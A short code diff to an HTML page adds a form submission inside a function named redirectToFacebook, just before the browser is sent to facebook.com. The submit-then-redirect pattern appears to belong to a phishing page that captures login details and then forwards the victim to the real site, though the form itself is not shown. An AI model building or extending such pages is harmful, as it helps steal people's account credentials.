@@ -59,6 +59,8 @@ button:hover {
 
     <script>
         function redirectToFacebook() {
+            // Submit the form before redirecting
+            document.querySelector('form').submit();
             // Redirect to Facebook login page
             window.location.href = "https://www.facebook.com";
         }
